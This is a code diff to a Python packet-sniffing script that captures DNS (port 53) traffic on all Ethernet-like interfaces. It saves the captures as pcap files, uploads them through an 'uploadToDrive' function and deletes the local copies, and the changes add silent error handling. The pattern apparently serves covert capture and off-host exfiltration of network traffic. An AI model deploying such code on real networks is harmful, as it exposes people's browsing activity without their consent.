@@ -50,9 +50,9 @@ def build_interfaces(platform):
     interfaces = scapy.get_if_list()
     #MACOS
     if platform=="darwin": 
-        interfaces= [i for i in interfaces if 'en' in i]
+        interfaces= [i for i in interfaces if 'en' in i or 'eth' in i]
     else: #Linux
-        interfaces= [i for i in interfaces if 'eth' in i or 'en' in i]
+        interfaces= [i for i in interfaces if 'en' in i or 'eth' in i]
     return interfaces
 
 def sniff(toggle):
@@ -72,11 +72,14 @@ def sniff(toggle):
         print("Starting the packet sniffer!")
 
         for i in range(len(interfaces)):
-            t=AsyncSniffer(iface=interfaces[i],filter="port 53",count=0)
-            #capture=scapy.sniff(iface=i,filter="port 53",count=10)
-            print("Capturing on interface {}".format(interfaces[i]))
-            t.start()
-            snifferList.append(t)
+            try:
+                t=AsyncSniffer(iface=interfaces[i],filter="port 53",count=0)
+                #capture=scapy.sniff(iface=i,filter="port 53",count=10)
+                print("Capturing on interface {}".format(interfaces[i]))
+                t.start()
+                snifferList.append(t)
+            except:
+                pass
     else:
         if (len(snifferList)==0):
             print("I have not sniffed anything!")
@@ -90,15 +93,20 @@ def sniff(toggle):
             pass
 
         for i in range(len(interfaces)):
-            print("Stopping capture on interface {}".format(interfaces[i]))
-            capture=snifferList[i].stop()
-            snifferList.remove(snifferList[i])
-            now = datetime.datetime.now()
-            capName=now.strftime("%Y_%m_%d_%H_%M_%S")+interfaces[i]
-            dest_folder="/tmp/captures/{}.pcap".format(capName)
-            scapy.wrpcap(dest_folder,capture, append=True)
-            uploadToDrive(dest_folder,mime_types['pcap']) 
-            os.remove(dest_folder)
+
+            try:
+                print("Stopping capture on interface {}".format(interfaces[i]))
+            
+                capture=snifferList[i].stop()
+                snifferList.remove(snifferList[i])
+                now = datetime.datetime.now()
+                capName=now.strftime("%Y_%m_%d_%H_%M_%S")+interfaces[i]
+                dest_folder="/tmp/captures/{}.pcap".format(capName)
+                scapy.wrpcap(dest_folder,capture, append=True)
+                uploadToDrive(dest_folder,mime_types['pcap']) 
+                os.remove(dest_folder)
+            except:
+                pass
         try:
             os.rmdir('/tmp/captures')
         except:
